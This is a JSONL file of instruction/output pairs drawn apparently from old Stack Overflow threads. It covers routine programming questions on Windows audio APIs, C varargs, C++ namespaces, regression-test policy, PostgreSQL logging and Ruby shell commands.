{"instruction": "How do I detect if the system has a default recording device installed?\nI bet this can be done through some calls to the Win32 API, anyone has any experience with this?\nI'm talking about doing this through code, not by opening the control panel and taking a look under sound options.", "output": "There is an Open Source Audio API called PortAudio that has a method you could use. I think the method is called Pa_GetDeviceInfo() or something."}
{"instruction": "I just wonder what the best approach is to have multiple users work on a Project in Visual Studio 2005 Professional.\nWe got a Solution with multiple Class Libraries, but when everyone opens the solution, we keep getting the \"X was modified, Reload/Discard?\" prompt all the time. Just opening one project is an obvious alternative, but I find it harder to use as you can't just see some of the other classes in other projects that way.\nAre there any Guidelines for Team Development with VS2005 Pro?\nEdit: Thanks. The current environment is a bit limited in the sense there is only 1 PC with RDP Connection, but that will change in the future. Marking the first answer as Accepted, but they are all good :)", "output": "A number of people have recommended using source control and I totally agree. However you also need do the following.\n\nExclude your personal options files from the repository (eg your .suo files)\nExclude your App.config files from the repository. - Not entirely but you need to have a Template.App.config. You commit that instead, and only copy your App.config into the Template.App.config when you make structural changes. That was each user has their own individual config for testing.\n\nThere are probably some other files worth excluding (obj directories and so forth) but thats all I can think of right now.\nPeter"}
{"instruction": "I have a file which is an XML representation of some data that is taken from a Web service and cached locally within a Web Application. The idea being is that this data is very static, but just might change. So I have set it up to cache to a file, and stuck a monitor against it to check if it has been deleted. Once deleted, the file will be refreshed from its source and rebuilt.\nI am now running in to problems though, because obviously in a multi-threaded environment it falls over as it is trying to access the data when it is still reading/writing the file.\nThis is confusing me, because I added a object to lock against, and this is always locked during read/write. It was my understanding that attempted access from other threads would be told to \"wait\" until the lock was released?\nJust to let you know, I am real new to multi-threaded development, so I am totally willing to accept this is a screw up on my part :)\n\nAm I missing something?\nWhat is the best file access strategy in a multi-threaded environment?\n\n\nEdit\nSorry - I should have said this is using ASP.NET 2.0 :)", "output": "You could maybe create the file with a temporary name (\"data.xml_TMP\"), and when it's ready change the name to what it is supposed to be. That way, no other process will be accessing it before it is ready."}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "You can download GNU Emacs NT from here direct. It works fine in windows, make sure you create a shortcut to the runemacs.exe file rather than the emacs.exe file so it doesn't show a command prompt before opening!\nXEmacs is less stable than GNU Emacs, and a lot of extensions are specifically written for GNU. I would recommend GNU > X.\nYou can place the .emacs file in the root of the drive it's installed on. Not sure whether you can add it elsewhere too..."}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "I use EmacsW32, it works great. EDIT: I now use regular GNU Emacs 24, see below.\nSee its EmacsWiki page for details.\nTo me, the biggest advantage is that:\n\nit has a version of emacsclient that starts the Emacs server if no server is running (open all your files in the same Emacs window)\nit includes several useful packages such as Nxml\nit has a Windows installer or you can build it from sources\n\nAnd concerning XEmacs, according to this post by Steve Yegge:\n\nTo summarize, I've argued that XEmacs has a much lower market share, poorer performance, more bugs, much lower stability, and at this point probably fewer features than GNU Emacs. When you add it all up, it's the weaker candidate by a large margin.\n\nEDIT: I now use regular GNU Emacs 24. It also contains Nxml, can be installed or built from sources, and with this wrapper, the Emacs server starts if no server is running. Cheers!"}
{"instruction": "How do I detect if the system has a default recording device installed?\nI bet this can be done through some calls to the Win32 API, anyone has any experience with this?\nI'm talking about doing this through code, not by opening the control panel and taking a look under sound options.", "output": "Using the DirectX SDK, you can call DirectSoundCaptureEnumerate, which will call your DSEnumCallback function for each DirectSoundCapture device on the system.  The first parameter passed to your DSEnumCallback is an LPGUID, which is the \"Address of the GUID that identifies the device being enumerated, or NULL for the primary device\".\nIf all you need to do is find out if a recording device is present (I don't think this is good enough if you really need to know the default device), you can use waveInGetNumDevs:\n#include <tchar.h>\n#include <windows.h>\n#include \"mmsystem.h\"\n\nint _tmain( int argc, wchar_t *argv[] )\n{\n    UINT deviceCount = waveInGetNumDevs();\n\n    if ( deviceCount > 0 )\n    {\n        for ( int i = 0; i < deviceCount; i++ )\n        {\n            WAVEINCAPSW waveInCaps;\n\n            waveInGetDevCapsW( i, &waveInCaps, sizeof( WAVEINCAPS ) );\n\n            // do some stuff with waveInCaps...\n        }\n    }\n\n    return 0;\n}"}
{"instruction": "I am looking to do this in C/C++.\nI came across Variable Length Arguments but this suggests a solution with Python & C using libffi.\nNow, if I want to wrap printf function with myprintf\nWhat I do is like below:\nvoid myprintf(char* fmt, ...)\n{\n    va_list args;\n    va_start(args,fmt);\n    printf(fmt,args);\n    va_end(args);\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    int a = 9;\n    int b = 10;\n    char v = 'C';\n    myprintf(\"This is a number: %d and \\nthis is a character: %c and \\n another number: %d\\n\",a, v, b);\n    return 0;\n}\n\nBut the results are not as expected!\nThis is a number: 1244780 and\nthis is a character: h and\nanother number: 29953463\n\nAny point where did I miss??", "output": "How do you mean a pure C/C++ solution?\nThe rest parameter (...) is supported cross platform in the C runtime.\nhttp://msdn.microsoft.com/en-us/library/kb57fad8.aspx"}
{"instruction": "I am looking to do this in C/C++.\nI came across Variable Length Arguments but this suggests a solution with Python & C using libffi.\nNow, if I want to wrap printf function with myprintf\nWhat I do is like below:\nvoid myprintf(char* fmt, ...)\n{\n    va_list args;\n    va_start(args,fmt);\n    printf(fmt,args);\n    va_end(args);\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    int a = 9;\n    int b = 10;\n    char v = 'C';\n    myprintf(\"This is a number: %d and \\nthis is a character: %c and \\n another number: %d\\n\",a, v, b);\n    return 0;\n}\n\nBut the results are not as expected!\nThis is a number: 1244780 and\nthis is a character: h and\nanother number: 29953463\n\nAny point where did I miss??", "output": "Are you using C or C++? The next C++ version, C++0x, will support variadic templates which provide a solution to that problem.\nAnother workaround can be achieved by clever operator overloading to achieve a syntax like this:\nvoid f(varargs va) {\n    BOOST_FOREACH(varargs::iterator i, va)\n        cout << *i << \" \";\n}\n\nf(args = 1, 2, 3, \"Hello\");\n\nIn order to get this to work, the class varargs has to be implemented to override operator = that returns a proxy object which, in turn, overrides operator ,. However, making this variant type safe in current C++ isn't possible as far as I know since it would have to work by type erasure."}
{"instruction": "I am looking to do this in C/C++.\nI came across Variable Length Arguments but this suggests a solution with Python & C using libffi.\nNow, if I want to wrap printf function with myprintf\nWhat I do is like below:\nvoid myprintf(char* fmt, ...)\n{\n    va_list args;\n    va_start(args,fmt);\n    printf(fmt,args);\n    va_end(args);\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    int a = 9;\n    int b = 10;\n    char v = 'C';\n    myprintf(\"This is a number: %d and \\nthis is a character: %c and \\n another number: %d\\n\",a, v, b);\n    return 0;\n}\n\nBut the results are not as expected!\nThis is a number: 1244780 and\nthis is a character: h and\nanother number: 29953463\n\nAny point where did I miss??", "output": "I am also unsure what you mean by pure\nIn C++ we use\n#include <cstdarg>\n#include <cstdio>\n\nclass Foo\n{   void Write(const char* pMsg, ...);\n};\n\nvoid Foo::Write( const char* pMsg, ...)\n{\n    char buffer[4096];\n    std::va_list arg;\n    va_start(arg, pMsg);\n    std::vsnprintf(buffer, 4096, pMsg, arg);\n    va_end(arg);\n    ...\n}"}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Although I realize this may not be an option yet, Google Chrome seems to have some features that have been added specifically to allow that. Again, maybe not usable, yet, but certainly very interesting!\n(See also the Chrome presentation, 27:30)"}
{"instruction": "I want to use the  MultipleLookupField control in a web page that will run in the context of SharePoint. I was wondering if anyone would help me with an example, which shows step by step how to use the control two display two SPField Collections.", "output": "Hm. Works fine on mine, so let's see if we can work out how your setup is different...\nIt looks as though it's having trouble populating the control; my first guess would be that this is because the code makes so many assumptions about the lists it's talking to. Can you check that you've got a plain vanilla Team site, with (assume these names are case-sensitive): \n\nA list called Tasks, with several items in it\nA library called Shared Documents with at least one document\nA column called Related in the Shared Documents library\nThe Related column is a Lookup field into the Title column of Tasks, and allows multiple values.\nThe first document in Shared Documents has a value for Related\n\nThen add the webpart. Fingers crossed..."}
{"instruction": "In simple terms, what are the reasons for, and what are the differences between the GPL v2 and GPL v3 open source licenses? Explanations and references to legal terms and further descriptions would be appreciated.", "output": "In (not entirely) cynical terms, the reason for the v3 license was Microsoft's patent deal with Novell.\nIn reality, you should always consult a lawyer when dealing with legal issues."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Some other reasons to choose Firefox:\n\nFirebug\nWeb Developer\nTamper Data\n\nThese addons make it a lot easier to develop web application for."}
{"instruction": "In simple terms, what are the reasons for, and what are the differences between the GPL v2 and GPL v3 open source licenses? Explanations and references to legal terms and further descriptions would be appreciated.", "output": "This page highlights the differences, but it's still quite a lot to read through."}
{"instruction": "I have a file which is an XML representation of some data that is taken from a Web service and cached locally within a Web Application. The idea being is that this data is very static, but just might change. So I have set it up to cache to a file, and stuck a monitor against it to check if it has been deleted. Once deleted, the file will be refreshed from its source and rebuilt.\nI am now running in to problems though, because obviously in a multi-threaded environment it falls over as it is trying to access the data when it is still reading/writing the file.\nThis is confusing me, because I added a object to lock against, and this is always locked during read/write. It was my understanding that attempted access from other threads would be told to \"wait\" until the lock was released?\nJust to let you know, I am real new to multi-threaded development, so I am totally willing to accept this is a screw up on my part :)\n\nAm I missing something?\nWhat is the best file access strategy in a multi-threaded environment?\n\n\nEdit\nSorry - I should have said this is using ASP.NET 2.0 :)", "output": "Here is the code that I use to make sure a file is not locked by another process.  It's not 100% foolproof, but it gets the job done most of the time:\n    /// <summary>\n    /// Blocks until the file is not locked any more.\n    /// </summary>\n    /// <param name=\"fullPath\"></param>\n    bool WaitForFile(string fullPath)\n    {\n        int numTries = 0;\n        while (true)\n        {\n            ++numTries;\n            try\n            {\n                // Attempt to open the file exclusively.\n                using (FileStream fs = new FileStream(fullPath,\n                    FileMode.Open, FileAccess.ReadWrite, \n                    FileShare.None, 100))\n                {\n                    fs.ReadByte();\n\n                    // If we got this far the file is ready\n                    break;\n                }\n            }\n            catch (Exception ex)\n            {\n                Log.LogWarning(\n                   \"WaitForFile {0} failed to get an exclusive lock: {1}\", \n                    fullPath, ex.ToString());\n\n                if (numTries > 10)\n                {\n                    Log.LogWarning(\n                        \"WaitForFile {0} giving up after 10 tries\", \n                        fullPath);\n                    return false;\n                }\n\n                // Wait for the lock to be released\n                System.Threading.Thread.Sleep(500);\n            }\n        }\n\n        Log.LogTrace(\"WaitForFile {0} returning true after {1} tries\",\n            fullPath, numTries);\n        return true;\n    }\n\nObviously you can tweak the timeouts and retries to suit your application.  I use this to process huge FTP files that take a while to be written."}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "If you stop testing it, how are you going to know when it's fixed, and more importantly, how are you going to know if it gets broken again?  I'm against taking out the test, because you're likely to forget to add it back in again."}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "I would say \"hell yeah!\". The simple fact is, is it failing? Yes! Then it should be logged. You are pretty much compromising your testing by allowing a failed test to pass.\nOne thing that would concern me personally, is that if I did this, and went under a bus, then the \"patch\" may not get removed, meaning even after a \"bugfix\" the bug may still remain.\nLeave it in, update your project notes, perhaps even move the severity down (if possible), but certainly dont break the thing that is checking for broken things ;)"}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "It should remain a failure if it's not doing what was expected.\nOtherwise, it's too easy to ignore.  Keep things simple -- it works or it doesn't.  Fail or success :)\n-- Kevin Fairchild"}
{"instruction": "I am considering log-shipping of Write Ahead Logs (WAL) in PostgreSQL to create a warm-standby database. However I have one table in the database that receives a huge amount of INSERT/DELETEs each day, but which I don't care about protecting the data in it. To reduce the amount of WALs produced I was wondering, is there a way to prevent any activity on one table from being recorded in the WALs?", "output": "To offer one option to my own question. There are temp tables - \"temporary tables are automatically dropped at the end of a session, or optionally at the end of the current transaction (see ON COMMIT below)\" - which I think don't generate WALs. Even so, this might not be ideal as the table creation & design will be have to be in the code."}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "Having a failing test is kind of grating.  There's a difference between broken code and unfinished code, and whether the test should be addressed immediately depends on which circumstance this failing test exposes.\nIf it's broken, you should fix it sooner rather than later.  If it's unfinished, deal with it when you have time.\nIn either case, clearly you can live with it behaving badly (for now), so as long as the issue is logged you might as well not have it nag you about it until you have time to fix it."}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "While I agree with most of what Paul said, the other side of the argument would be that regression tests, strictly speaking, are supposed to test for changes in the program's behavior, not just any old bug.  They're specifically supposed to tell you when you've broken something that used to work.\nI think this boils down to what other sorts of tests are run on this app.  If you have some sort of unit test system, maybe that would be a more appropriate place for this test, rather than in the regression test (at least until the bug is fixed).  If the regression tests are your only tests, however, I would probably leave the test in place."}
{"instruction": "I'm working on an automated regression test suite for an app which I maintain.  While developing the automated regression test, I ran across some behavior that's almost certainly a bug.  So, for now, I've modified the automated regression test to not register a failure--it's deliberately allowing this bad behavior to go by, I mean.  \nSo, I am interested in the opinions of others on this site.  Obviously, I'll add a bug to our defect tracking to make sure this error behavior gets fixed.  But are there any compelling reasons (either way) to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior?  I think of this as a 6 of one and a half-dozen of the other type of question but I ask here because I thought others may see it differently.\n\n@Paul Tomblin,\nJust to be clear--I've never considered removing the test; I was simply considering modifying the pass/fail condition to allow for the failure without it being thrown up in my face every time I run the test. \nI'm a little concerned about repeated failures from known causes eventually getting treated like warnings in C++.  I know developers who see warnings in their C++ code and simply ignore them because they think they're just useless noise.  I'm afraid leaving a known failure in the regression suite might cause people to start ignoring other, possibly more important, failures. \nBTW, lest I be misunderstood, I consider warnings in C++ to be an important aid in crafting strong code but judging from other C++ developers I've met I think I'm in the minority.", "output": "We added a 'snooze' feature to our unit tests.  This allowed a test to be annotated with an attribute that basically said 'ignore failures for X weeks from this date'.  Developers could annotate a test they knew would not get fixed for a while with this, but it didn't require any intervention in the future to manually re-enable it, the test would simply pop back into the test suite at the designated time."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Namespaces are packages essentially. They can be used like this:\nnamespace MyNamespace\n{\n  class MyClass\n  {\n  };\n}\n\nThen in code:\nMyNamespace::MyClass* pClass = new MyNamespace::MyClass();\n\nHope that helps.\nOr, if you want to always use a specific namespace, you can do this:\nusing namespace MyNamespace;\n\nMyClass* pClass = new MyClass();\n\nEdit: Following what bernhardrusch has said, I tend not to use the \"using namespace x\" syntax at all, I usually explicitly specify the namespace when instantiating my objects (i.e. the first example I showed).\nAnd as you asked below, you can use as many namespaces as you like."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Generally speaking, I create a namespace for a body of code if I believe there might possibly be function or type name conflicts with other libraries. It also helps to brand code, ala boost:: ."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "I prefer using a top-level namespace for the application and sub namespaces for the components.\nThe way you can use classes from other namespaces is surprisingly very similar to the way in java.\nYou can either use \"use NAMESPACE\" which is similar to an \"import PACKAGE\" statement, e.g. use std. Or you specify the package as prefix of the class separated with \"::\", e.g. std::string. This is similar to \"java.lang.String\" in Java."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "@marius\nYes, you can use several namespaces at a time, eg:\nusing namespace boost;   \nusing namespace std;  \n\nshared_ptr<int> p(new int(1));   // shared_ptr belongs to boost   \ncout << \"cout belongs to std::\" << endl;   // cout and endl are in std\n\n[Feb. 2014 -- (Has it really been that long?): This particular example is now ambiguous, as Joey points out below. Boost and std:: now each have a shared_ptr.]"}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "In Java:\npackage somepackage;\nclass SomeClass {}\n\nIn C++:\nnamespace somenamespace {\n    class SomeClass {}\n}\n\nAnd using them, Java:\nimport somepackage;\n\nAnd C++:\nusing namespace somenamespace;\n\nAlso, full names are \"somepackge.SomeClass\" for Java and \"somenamespace::SomeClass\" for C++. Using those conventions, you can organize like you are used to in Java, including making matching folder names for namespaces. The folder->package and file->class requirements aren't there though, so you can name your folders and classes independently off packages and namespaces."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "To avoid saying everything Mark Ingram already said a little tip for using namespaces:\nAvoid the \"using namespace\" directive in header files - this opens the namespace for all parts of the program which import this header file. In implementation files (*.cpp) this is normally no big problem - altough I prefer to use the \"using namespace\" directive on the function level.\nI think namespaces are mostly used to avoid naming conflicts - not necessarily to organize your code structure. I'd organize C++ programs mainly with header files / the file structure.\nSometimes namespaces are used in bigger C++ projects to hide implementation details.\nAdditional note to the using directive:\nSome people prefer using \"using\" just for single elements:    \nusing std::cout;  \nusing std::endl;"}
{"instruction": "I would like to execute an OS command from my ruby script but I want to add an argument from a ruby variable.\nI know that's possible by using keyword system like that :\n#!/usr/bin/env ruby\ndirectory = '/home/paulgreg/'\nsystem 'ls ' + directory\n\nbut is that possible by using the \"backquotes or backticks syntax\" ?\n(I mean by using that syntax : ls)", "output": "No, that will just concatenate the output from ls and the contents of directory.\nBut you can do this:\n#!/usr/bin/env ruby\ndirectory = '/home/paulgreg/'\n`ls #{directory}`"}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Also, note that you can add to a namespace. This is clearer with an example, what I mean is that you can have:\nnamespace MyNamespace\n{\n    double square(double x) { return x * x; }\n}\n\nin a file square.h, and\nnamespace MyNamespace\n{\n    double cube(double x) { return x * x * x; }\n}\n\nin a file cube.h. This defines a single namespace MyNamespace (that is, you can define a single namespace across multiple files)."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Note that a namespace in C++ really is just a name space.  They don't provide any of the encapsulation that packages do in Java, so you probably won't use them as much."}
{"instruction": "I am in need of a way to mute a specific application in Vista.\nExample: Mute just Firefox, but not all of the other application.  Much similar to muting a specific program from within the volume mixer in vista. \nIf there is a program that will do this, i would appreciate that.  Otherwise if there is a way to do this, I will write a small app(Preferrably something .net).\nEDIT: I want to automate this procedure, possibly key-map it.", "output": "I suggest using the built in Mixer in Vista...\nWhy do you want to use an 3rd party program?"}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "I've used C++ namespaces the same way I do in C#, Perl, etc.  It's just a semantic separation of symbols between standard library stuff, third party stuff, and my own code.  I would place my own app in one namespace, then a reusable library component in another namespace for separation."}
{"instruction": "I am looking to do this in C/C++.\nI came across Variable Length Arguments but this suggests a solution with Python & C using libffi.\nNow, if I want to wrap printf function with myprintf\nWhat I do is like below:\nvoid myprintf(char* fmt, ...)\n{\n    va_list args;\n    va_start(args,fmt);\n    printf(fmt,args);\n    va_end(args);\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    int a = 9;\n    int b = 10;\n    char v = 'C';\n    myprintf(\"This is a number: %d and \\nthis is a character: %c and \\n another number: %d\\n\",a, v, b);\n    return 0;\n}\n\nBut the results are not as expected!\nThis is a number: 1244780 and\nthis is a character: h and\nanother number: 29953463\n\nAny point where did I miss??", "output": "the problem is that you cannot use 'printf' with va_args.  You must use vprintf if you are using variable argument lists.  vprint, vsprintf, vfprintf, etc.  (there are also 'safe' versions in Microsoft's C runtime that will prevent buffer overruns, etc.)\nYou sample works as follows:\nvoid myprintf(char* fmt, ...)\n{\n    va_list args;\n    va_start(args,fmt);\n    vprintf(fmt,args);\n    va_end(args);\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    int a = 9;\n    int b = 10;\n    char v = 'C'; \n    myprintf(\"This is a number: %d and \\nthis is a character: %c and \\n another number: %d\\n\",a, v, b);\n    return 0;\n}"}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Another difference between java and C++, is that in C++, the namespace hierarchy does not need to mach the filesystem layout.  So I tend to put an entire reusable library in a single namespace, and subsystems within the library in subdirectories:\n#include \"lib/module1.h\"\n#include \"lib/module2.h\"\n\nlib::class1 *v = new lib::class1();\n\nI would only put the subsystems in nested namespaces if there was a possibility of a name conflict."}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "You can also contain \"using namespace ...\" inside a function for example:\nvoid test(const std::string& s) {\n    using namespace std;\n    cout << s;\n}"}
{"instruction": "If you had to provide a wizard like form entry experience in mvc how would you abstract the page flow?", "output": "public class CreateAccountWizardController : Controller\n{\n   public ActionRresult Step1()\n   {\n   }\n\n\n   public ActionResult Step2()\n   {\n   }\n}"}
{"instruction": "I would like to execute an OS command from my ruby script but I want to add an argument from a ruby variable.\nI know that's possible by using keyword system like that :\n#!/usr/bin/env ruby\ndirectory = '/home/paulgreg/'\nsystem 'ls ' + directory\n\nbut is that possible by using the \"backquotes or backticks syntax\" ?\n(I mean by using that syntax : ls)", "output": "`ls #{directory}`\n\nisn't very safe because you're going to run into problems with path names that have spaces in them.  \nIt's safer to do something like this:\ndirectory = '/home/paulgreg/'\n\nargs = []\nargs << \"/bin/ls\"\nargs << directory\n\nsystem(*args)"}
{"instruction": "I have a custom installer action that updates the PATH environment, and creates an additional environment variable. Appending a directory to the existing path variable is working fine, but for some reason my attempts to create a new environment variable have been unsuccessful. The code I am using is:\n        using (RegistryKey reg = Registry.LocalMachine.OpenSubKey(@\"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\", true))\n        {\n            reg.SetValue(\"MYVAR\", \"SomeVal\", RegistryValueKind.ExpandString);\n        }\n\nEdit: The OS is 32-bit XP, and as far as I can tell it is failing silently.", "output": "It turns out there was another problem that was preventing the code in my question from being called. However, I was using the Win32 assembly because the example code I was following was written before the Environment assembly became available. So Thanks Peter for pointing out the Environment API."}
